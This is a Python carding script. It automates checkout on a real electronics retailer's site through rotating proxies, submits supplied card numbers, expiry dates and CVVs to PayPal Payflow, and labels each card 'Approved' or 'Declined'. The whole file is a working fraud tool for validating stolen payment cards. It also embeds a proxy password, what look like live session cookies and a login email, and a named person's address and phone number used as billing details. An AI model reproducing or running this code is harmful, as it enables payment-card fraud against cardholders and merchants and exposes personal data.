import requests
import time,random,names
from bs4 import BeautifulSoup

#Instalar lxml

def choiceprox():
    with open('proxies.txt', 'r') as file:
        proxies_list = file.read().split('\n')
        proxy = random.choice(proxies_list)
        prox = proxy.split(":")
        return prox
    
def chck(cc,mes,ano,cvv):
    first = names.get_first_name()
    last = names.get_last_name()
    correoRand = f"{first}{last}{random.randint(10000,999999)}@gmail.com"

    session = requests.session()
    lista = choiceprox()

    prox =  f"http://{lista[2]}:pyko8571nes20eo@rp.proxyscrape.com:6060" 

    proxies = {
        'http': prox,
        'https': prox
    } 
    headers = {
    'authority': 'www.electrohome.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'mage-banners-cache-storage={}; form_key=WMxkn7MMqEhcTw2v; store=electrohome_ca; _gid=GA1.2.307844765.1698759447; _fbp=fb.1.1698759454411.524250899; _ju_dm=cookie; _ju_dn=1; _ju_dc=ab26a12a-77f2-11ee-a2bc-b3213757b56b; PHPSESSID=0ef87ee9ce914e8a873077f180704ffa; form_key=WMxkn7MMqEhcTw2v; X-Magento-Vary=f5812fd05cac422ca18da6f1036ee2f9eaa2781e; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _ju_v=4.1_6.02; mage-banners-cache-storage={}; _dc_gtm_UA-4687431-11=1; _ga_660D221NYV=GS1.1.1698770125.2.1.1698770291.59.0.0; __kla_id=eyJjaWQiOiJZVGRsTkRBeFpHRXRabUV4TmkwMFpUbGhMV0U0WXpJdFlURmhZalF4WWpNek1HRXgiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTg3NTk0NTMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL2NoZWNrb3V0L2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTg3NzAyOTEsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS9jaGVja291dC9jYXJ0LyJ9LCIkZXhjaGFuZ2VfaWQiOiJIRFZlc1dYVkp3d3QyMy1YQmNGUU1RbEYyOW5XdHBaaEtfNk1DNFF2VHo4PS5XTWJrR0QifQ==; _ga_255060517=GS1.1.1698770126.2.1.1698770291.0.0.0; _ga=GA1.1.2085552748.1698759386; private_content_version=33bf75c6ff9bf4b1007d3230f8e239db; _uetsid=a1d483c077f211ee9ea5c1491966c8c5; _uetvid=a1d4e3a077f211eeb5dd07d58d99bdea; _ju_pn=3; section_data_ids={%22cart%22:1698770293}',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
    req1 = session.get('https://www.electrohome.com/checkout/cart/',headers=headers,proxies=proxies)
                    
    soup_response = req1.text
    soup = BeautifulSoup(soup_response , 'html.parser')
    form_key = soup.find("input", {"name": "form_key"})["value"]
                   
    if cc[:1] == "4":
        ctype = "VI"
    if cc[:1] == "5":
        ctype = "MC"
    else:
        ctype = "AM"
                
                
    headersh = {
    'authority': 'www.electrohome.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'store=electrohome_ca; _fbp=fb.1.1698759454411.524250899; _ju_dn=1; _ju_dc=ab26a12a-77f2-11ee-a2bc-b3213757b56b; zHello=1; fastly_geo_store=electrohome_ca; PHPSESSID=077a08422665448130bb55090898cfdb; X-Magento-Vary=f5812fd05cac422ca18da6f1036ee2f9eaa2781e; mage-banners-cache-storage={}; form_key=FdHDJ6CT4If43w5f; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=FdHDJ6CT4If43w5f; _gid=GA1.2.697201658.1701118222; _ju_v=4.1_6.03; _ju_dm=cookie; _dc_gtm_UA-4687431-11=1; zCountry=US; _ga_660D221NYV=GS1.1.1701118215.5.1.1701118495.50.0.0; __kla_id=eyJjaWQiOiJZVGRsTkRBeFpHRXRabUV4TmkwMFpUbGhMV0U0WXpJdFlURmhZalF4WWpNek1HRXgiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTg3NTk0NTMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL2NoZWNrb3V0L2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MDExMTg0OTYsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5lbGVjdHJvaG9tZS5jb20vYWNjZXNzb3JpZXMifSwiJGV4Y2hhbmdlX2lkIjoiSERWZXNXWFZKd3d0MjMtWEJjRlFNUWxGMjluV3RwWmhLXzZNQzRRdlR6OD0uV01ia0dEIn0=; _ga_255060517=GS1.1.1701118223.5.1.1701118495.0.0.0; private_content_version=16d53bf10c5ea2cb7072ccb32d89be0b; _ga=GA1.2.2085552748.1698759386; _uetsid=95b1be108d6611eeb9fb1fb55734c27e; _uetvid=a1d4e3a077f211eeb5dd07d58d99bdea; _ju_pn=3; _gali=product-addtocart-button; section_data_ids={%22cart%22:null%2C%22directory-data%22:null%2C%22signifyd-fingerprint%22:null%2C%22gtm%22:null%2C%22wp_confirmation_popup%22:null%2C%22messages%22:null}',
    'origin': 'https://www.electrohome.com',
    'referer': 'https://www.electrohome.com/premium-grade-3-5mm-auxiliary-audio-cable-3-feet',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}

    datah = {
    'product': '912',
    'selected_configurable_option': '',
    'related_product': '',
    'item': '912',
    'form_key': f'{form_key}',
}

    session.post('https://www.electrohome.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL3ByZW1pdW0tZ3JhZGUtMy01bW0tYXV4aWxpYXJ5LWF1ZGlvLWNhYmxlLTMtZmVldA%2C%2C/product/912/',headers=headersh,data=datah,proxies = proxies)
        
        
    headersS = {
    'authority': 'www.electrohome.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'store=electrohome_ca; _fbp=fb.1.1698759454411.524250899; _ju_dn=1; _ju_dc=ab26a12a-77f2-11ee-a2bc-b3213757b56b; zHello=1; fastly_geo_store=electrohome_ca; PHPSESSID=077a08422665448130bb55090898cfdb; X-Magento-Vary=f5812fd05cac422ca18da6f1036ee2f9eaa2781e; mage-banners-cache-storage={}; form_key=FdHDJ6CT4If43w5f; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=FdHDJ6CT4If43w5f; _gid=GA1.2.697201658.1701118222; _ju_v=4.1_6.03; _ju_dm=cookie; mage-messages=; private_content_version=c0d04fb9c40e800129e9974f5dc41868; section_data_ids={%22cart%22:1701118759%2C%22directory-data%22:1701118514%2C%22signifyd-fingerprint%22:1701118514%2C%22gtm%22:1701118514%2C%22wp_confirmation_popup%22:1701118514}; amzn-checkout-session={}; zCountry=US; _ga_660D221NYV=GS1.1.1701118215.5.1.1701118834.58.0.0; _ga_255060517=GS1.1.1701118223.5.1.1701118834.0.0.0; _ga=GA1.2.2085552748.1698759386; _uetsid=95b1be108d6611eeb9fb1fb55734c27e; _uetvid=a1d4e3a077f211eeb5dd07d58d99bdea; _ju_pn=6; __kla_id=eyJjaWQiOiJZVGRsTkRBeFpHRXRabUV4TmkwMFpUbGhMV0U0WXpJdFlURmhZalF4WWpNek1HRXgiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTg3NTk0NTMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL2NoZWNrb3V0L2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MDExMTg4MzYsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5lbGVjdHJvaG9tZS5jb20vYWNjZXNzb3JpZXMifSwiJGV4Y2hhbmdlX2lkIjoiSERWZXNXWFZKd3d0MjMtWEJjRlFNUWxGMjluV3RwWmhLXzZNQzRRdlR6OD0uV01ia0dEIn0=',
    'referer': 'https://www.electrohome.com/checkout/cart/',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}
    reqcart = session.get('https://www.electrohome.com/checkout/', headers=headersS, proxies=proxies)
                    
    responsev1 = reqcart.text
    lines = responsev1.split('"quoteData":{"entity_id":"')[1]
    entity = lines.split('","')[0] #find_between(res1.text,'"{"entity_id":"','"')
      
                        
    headers = {
    'authority': 'www.electrohome.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    # 'cookie': 'form_key=WMxkn7MMqEhcTw2v; store=electrohome_ca; _gid=GA1.2.307844765.1698759447; _fbp=fb.1.1698759454411.524250899; _ju_dm=cookie; _ju_dn=1; _ju_dc=ab26a12a-77f2-11ee-a2bc-b3213757b56b; PHPSESSID=0ef87ee9ce914e8a873077f180704ffa; form_key=WMxkn7MMqEhcTw2v; X-Magento-Vary=f5812fd05cac422ca18da6f1036ee2f9eaa2781e; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _ju_v=4.1_6.02; mage-banners-cache-storage={}; mage-messages=; _ga_660D221NYV=GS1.1.1698770125.2.1.1698770479.48.0.0; __kla_id=eyJjaWQiOiJZVGRsTkRBeFpHRXRabUV4TmkwMFpUbGhMV0U0WXpJdFlURmhZalF4WWpNek1HRXgiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTg3NTk0NTMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL2NoZWNrb3V0L2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTg3NzA0ODAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS9jaGVja291dC9jYXJ0LyJ9LCIkZXhjaGFuZ2VfaWQiOiJIRFZlc1dYVkp3d3QyMy1YQmNGUU1RbEYyOW5XdHBaaEtfNk1DNFF2VHo4PS5XTWJrR0QifQ==; _ga_255060517=GS1.1.1698770126.2.1.1698770480.0.0.0; _ga=GA1.2.2085552748.1698759386; amzn-checkout-session={}; _uetsid=a1d483c077f211ee9ea5c1491966c8c5; _uetvid=a1d4e3a077f211eeb5dd07d58d99bdea; _ju_pn=8; section_data_ids={%22cart%22:1698770463%2C%22directory-data%22:1698770452%2C%22signifyd-fingerprint%22:1698770452%2C%22gtm%22:1698770570%2C%22wp_confirmation_popup%22:1698770452%2C%22messages%22:1698770676}; private_content_version=45090af08d1d9c85b9f1b458eaf7ee50; _gali=payflowpro_cc_number',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4NDMwMTciLCJhcCI6Ijc3NzgzNDQ4NCIsImlkIjoiNmExOTdmYTMyY2FkOTAzYSIsInRyIjoiZGQxM2MyZjE4YmQ5MGFjMTUwNjZkMDI4NmJjYjg5MDAiLCJ0aSI6MTY5ODc3MDk3Mjk3OCwidGsiOiIxMzIyODQwIn19',
    'origin': 'https://www.electrohome.com',
    'referer': 'https://www.electrohome.com/checkout/',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-dd13c2f18bd90ac15066d0286bcb8900-6a197fa32cad903a-01',
    'tracestate': '1322840@nr=0-1-2843017-777834484-6a197fa32cad903a----1698770972978',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'x-newrelic-id': 'Vg4DUlZSDxAHVFZaBwUCUFE=',
    'x-requested-with': 'XMLHttpRequest',
}


    json_data = {
    'cartId': f'{entity}',
    'paymentMethod': {
        'method': 'payflowpro',
        'additional_data': {
            'cc_type': f'{ctype}',
            'cc_exp_year': f'{ano}',
            'cc_exp_month': f'{mes}',
            'cc_last_4': f'{cc[12:]}',
        },
    },
    'email': f'{correoRand}',
    'billingAddress': {
        'countryId': 'US',
        'regionId': 12,
        'regionCode': 'CA',
        'region': 'California',
        'street': [
            '2329 W DOROTHEA AVE',
        ],
        'telephone': '7868984170',
        'postcode': '93277-7205',
        'city': 'VISALIA',
        'firstname': 'Yvonne Ortiz',
        'lastname': 'Perz',
    },
}

    session.post(f'https://www.electrohome.com/rest/electrohome_ca/V1/guest-carts/{entity}/set-payment-information',headers=headers,json=json_data,proxies=proxies)
        
        
    headers = {
    'authority': 'www.electrohome.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'form_key=WMxkn7MMqEhcTw2v; store=electrohome_ca; _gid=GA1.2.307844765.1698759447; _fbp=fb.1.1698759454411.524250899; _ju_dm=cookie; _ju_dn=1; _ju_dc=ab26a12a-77f2-11ee-a2bc-b3213757b56b; PHPSESSID=0ef87ee9ce914e8a873077f180704ffa; form_key=WMxkn7MMqEhcTw2v; X-Magento-Vary=f5812fd05cac422ca18da6f1036ee2f9eaa2781e; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _ju_v=4.1_6.02; mage-banners-cache-storage={}; mage-messages=; _ga_660D221NYV=GS1.1.1698770125.2.1.1698770479.48.0.0; __kla_id=eyJjaWQiOiJZVGRsTkRBeFpHRXRabUV4TmkwMFpUbGhMV0U0WXpJdFlURmhZalF4WWpNek1HRXgiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTg3NTk0NTMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZWxlY3Ryb2hvbWUuY29tL2NoZWNrb3V0L2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTg3NzA0ODAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmVsZWN0cm9ob21lLmNvbS9jaGVja291dC9jYXJ0LyJ9LCIkZXhjaGFuZ2VfaWQiOiJIRFZlc1dYVkp3d3QyMy1YQmNGUU1RbEYyOW5XdHBaaEtfNk1DNFF2VHo4PS5XTWJrR0QifQ==; _ga_255060517=GS1.1.1698770126.2.1.1698770480.0.0.0; _ga=GA1.2.2085552748.1698759386; amzn-checkout-session={}; _uetsid=a1d483c077f211ee9ea5c1491966c8c5; _uetvid=a1d4e3a077f211eeb5dd07d58d99bdea; _ju_pn=8; private_content_version=19e0c92b5d0b6301e2349483e187b016; section_data_ids={%22cart%22:1698770463%2C%22directory-data%22:1698770452%2C%22signifyd-fingerprint%22:1698770452%2C%22gtm%22:1698770570%2C%22wp_confirmation_popup%22:1698770452%2C%22messages%22:1698771977}',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4NDMwMTciLCJhcCI6Ijc3NzgzNDQ4NCIsImlkIjoiMjczZTc2ZDY0ODY5NTk3YyIsInRyIjoiMDczZTA5ZDNhOTExYzE2YzBjZDkwMTdlOTA2YmZjMDAiLCJ0aSI6MTY5ODc3MTA2Nzc3OSwidGsiOiIxMzIyODQwIn19',
    'origin': 'https://www.electrohome.com',
    'referer': 'https://www.electrohome.com/checkout/',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-073e09d3a911c16c0cd9017e906bfc00-273e76d64869597c-01',
    'tracestate': '1322840@nr=0-1-2843017-777834484-273e76d64869597c----1698771067779',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'x-newrelic-id': 'Vg4DUlZSDxAHVFZaBwUCUFE=',
    'x-requested-with': 'XMLHttpRequest',
}

    data = [
    ('form_key', f'{form_key}'),
    ('captcha_form_id', 'payment_processing_request'),
    ('custom_payment_method', 'payflowpro'),
    ('payment[method]', 'payflowpro'),
    ('captcha_form_id', 'co-payment-form'),
    ('controller', 'checkout_flow'),
    ('cc_type', 'VI'),
]
    req2 = session.post('https://www.electrohome.com/paypal/transparent/requestSecureToken/',headers=headers,data=data, proxies=proxies)

    ret = req2.json()
    securetoken   = ret['payflowpro']['fields']['securetoken']
    securetokenid = ret['payflowpro']['fields']['securetokenid']
                    
                
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'cookie_check=yes; d_id=67911e870dd647f284ad06d448119b0a1697536609615; enforce_policy=ccpa; sc_f=ABiOQ6ajvwzLMJQG0ttJ47XBgksv_JADAvDN8WzVRqYhqb9N4ztVUm32C44vIRkbUmNthQWpotaTCq5OnZBzxW_O0RcR3LaHvpZvq0; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; KHcl0EuY7AKSMgfvHl7J5E7hPtK=Nie3vxRT1kv7NE7CAkpev1U585Zagl2H0SvPgSPTLhkD4r_PtYhoIGG5XmXSefu_7tsrSC8G0jaMs94h; login_email=alipresscuenta%40gmail.com; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6ImdtOUdKSTZIaDJYZzBYUS13RFVWOHdrRE1vVnA1dVFXYU5GVE91VUh6SExaNUlKNVhIcGZHUWlpSEEwWXZTbzhQemdpSkcxRTFPN2VTdzZGZjI0MXVONk42N2FrU3pVYmNyanFKaHJjMXY0NmtzaU1BRjJqNmViOHVoZUF0bEpRNVFuN2FWYUhOdFlNX2hzZnc1OFFVdzRvdjd5ZVA5R0R3MmdjR19VVXVVZmthSm9mOGpBNS12alM5MXUiLCJpYXQiOjE2OTg3MDQ0NTAsImV4cCI6MTY5ODcwODA1MH0.szlZzD4iYDWSnv6UyWcxp53XFvY493Jy3EzvXNCj4UU; LANG=en_US%3BUS; ts_c=vr%3D12cfa23e18b0ad1014b7a1b3ff187ca5%26vt%3D85ff31f018b0ad10ec48995dfa9e38bc; tsrce=smartcomponentnodeweb; ts=vreXpYrS%3D1793454868%26vteXpYrS%3D1698762268%26vr%3D12cfa23e18b0ad1014b7a1b3ff187ca5%26vt%3D85ff31f018b0ad10ec48995dfa9e38bc%26vtyp%3Dreturn',
    'Origin': 'https://www.electrohome.com',
    'Referer': 'https://www.electrohome.com/',
    'Sec-Fetch-Dest': 'iframe',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'result': '0',
    'securetoken': f'{securetoken}',
    'securetokenid': f'{securetokenid}',
    'respmsg': 'Approved',
    'result_code': '0',
    'csc': f'{cvv}',
    'expdate': f'{mes}{ano}',
    'acct': f'{cc}',
}
    req3 = session.post('https://payflowlink.paypal.com/', headers=headers, data=data,proxies=proxies) 
                    
    fin = time.perf_counter()
    resposta = req3.text
    soup = BeautifulSoup(resposta , 'html.parser')
                    
                   
    if int(resposta.find('name="PROCCVV2"')) > 0 :
        AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
        PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                    
        if RESPMSG == "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.":
            status = "Approved/CCN ✅"
            RESPMSG = "CVV2 Mismatch"
                    
        elif RESPMSG == "Verified: 10574-This card authorization verification is not a payment transaction.":
            status = "Approved ✅"
            RESPMSG = "Verified: 10574"
                    
        elif RESPMSG == "Declined: 15005-This transaction cannot be processed.":
            status = "Declined ❌"
            RESPMSG = "Declined: 15005"
                    
        elif RESPMSG == "Declined: 15005-This transaction cannot be processed.":
            status = "Declined ❌"
            RESPMSG = "Declined: 15005"
                        
        elif RESPMSG == "10069-Declined: 10069-Payment could not be completed due to a sender account issue. Please notify the user to contact PayPal Customer Support.":
            status = "Declined ❌"
            RESPMSG = "Payment could not be completed due to a sender account issue"
        elif RESPMSG == "Invalid expiration date: 10502-This transaction cannot be processed. Please use a valid credit card.":
            status = "Declined ❌"
            RESPMSG = "Invalid expiration date/Please use a valid credit card"
        elif RESPMSG == "Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type.":
            status = "Declined ❌"
            RESPMSG = "Invalid account number:  10535"
                    
        else:
            status = "DECLINED ❌"
            RESPMSG = "DECLINED Card"
    else:
        status = "DECLINED ❌"
        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
        PROCCVV2 = "not available"
        AVSDATA = "not available"  
                        
    print(f"""Estado: {status} 
Respuesta: {RESPMSG}  
AVS:[{AVSDATA}] - CVV2:[{PROCCVV2}]
Create by: @kanye_ee""")



def menu():
    ccs=input("your cc: ")
    cc=ccs.split('|')[0]
    mes=ccs.split('|')[1]
    ano=ccs.split('|')[2]
    cvv=ccs.split('|')[3]
    chck(cc,mes,ano,cvv)
    

while True:
    menu()
    input()
    
    
